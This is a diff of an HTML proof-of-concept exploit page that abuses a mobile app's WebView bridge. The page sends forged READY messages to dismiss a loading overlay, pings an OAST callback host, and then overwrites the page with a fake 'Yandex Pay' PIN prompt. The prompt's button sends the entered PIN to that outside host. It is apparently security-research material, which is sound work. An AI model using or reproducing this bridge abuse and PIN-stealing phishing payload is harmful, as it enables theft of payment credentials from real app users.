@@ -1,38 +1,27 @@
 <html><head><title>PoC</title></head>
-  <body>
-  <script>
-  // Send READY message to dismiss loading overlay
-  // The native app reads from __plusSDKMobileCompat.onMessage
-  // But we need to send TO native, not FROM native
+<body>
+<script>
+// Send READY message to dismiss loading overlay
+window.__plusSDKMobileCompat.onMessage(JSON.stringify({type:"READY",trackId:"12345678-1234-1234-1234-123456789abc"}));
 
-  // On iOS the page sends messages by calling onMessage on itself
-  // which the native side intercepts via KVO or method swizzling
-  // OR the page posts a message that the native WebView client picks up
+// Also try postMessage to parent
+window.parent.postMessage(JSON.stringify({type:"READY",trackId:"12345678-1234-1234-1234-123456789abc"}), "*");
 
-  // Try calling onMessage with READY (the native might be listening)
-  window.__plusSDKMobileCompat.onMessage(JSON.stringify({type:"READY",trackId:"12345678-1234-1234-1234-123456789abc"}));
+// Try navigation-based approach (iOS WKWebView intercepts scheme navigations)
+var iframe = document.createElement('iframe');
+iframe.src = 'plus-sdk-message://' + encodeURIComponent(JSON.stringify({type:"READY",trackId:"12345678-1234-1234-1234-123456789abc"}));
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
 
-  // Also try postMessage to parent
-  window.parent.postMessage(JSON.stringify({type:"READY",trackId:"12345678-1234-1234-1234-123456789abc"}), "*");
+// Report
+setTimeout(function(){
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ready-sent?ok=1");
+}, 2000);
 
-  // Try navigation-based approach (iOS WKWebView intercepts scheme navigations)
-  var iframe = document.createElement('iframe');
-  iframe.src = 'plus-sdk-message://' + encodeURIComponent(JSON.stringify({type:"READY",trackId:"12345678-1234-1234-1234-123456789abc"}));
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-
-  // Report
-  setTimeout(function(){
-    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ready-sent?ok=1");
-  }, 2000);
-
-  // If the overlay dismisses, we can now show phishing content
-  setTimeout(function(){
-    document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:-apple-system;color:#fff;background:#111;min-height:100vh;"><h2>Yandex Pay</h2><p>Confirm your identity</p><input 
-  type="password" id="pin" placeholder="Enter PIN" style="font-size:24px;padding:15px;width:200px;text-align:center;border-radius:8px;border:1px solid #444;background:#222;color:#fff;"><br><br><button 
-  onclick="fetch(\'https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/pin?\'+document.getElementById(\'pin\').value)" style="padding:15px 
-  40px;background:#fc0;border:none;border-radius:8px;font-size:18px;">Confirm</button></div>';
-  }, 3000);
-  </script>
-  </body>
-  </html>
+// If the overlay dismisses, show phishing content
+setTimeout(function(){
+  document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:-apple-system;color:#fff;background:#111;min-height:100vh;"><h2>Yandex Pay</h2><p>Confirm your identity</p><input type="password" id="pin" placeholder="Enter PIN" style="font-size:24px;padding:15px;width:200px;text-align:center;border-radius:8px;border:1px solid #444;background:#222;color:#fff;"><br><br><button onclick="fetch(\'https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/pin?\'+document.getElementById(\'pin\').value)" style="padding:15px 40px;background:#fc0;border:none;border-radius:8px;font-size:18px;">Confirm</button></div>';
+}, 3000);
+</script>
+</body>
+</html>
